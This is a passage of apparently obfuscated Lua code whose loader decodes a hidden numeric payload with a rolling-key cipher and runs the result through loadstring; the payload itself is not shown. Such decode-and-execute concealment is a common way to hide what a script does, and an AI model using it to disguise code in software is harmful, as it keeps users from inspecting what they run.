    local function VM_l01lI(d, k, m)
        local R_1OOOO0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_1OOOO0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_1OOOO0)
    end

    -- Execution Guard
    local F_11OO0lO = loadstring(VM_l01lI(B_l1Ol1I1, 43, 5))
    if F_11OO0lO then
        F_11OO0lO(...)
    end
end)(...)
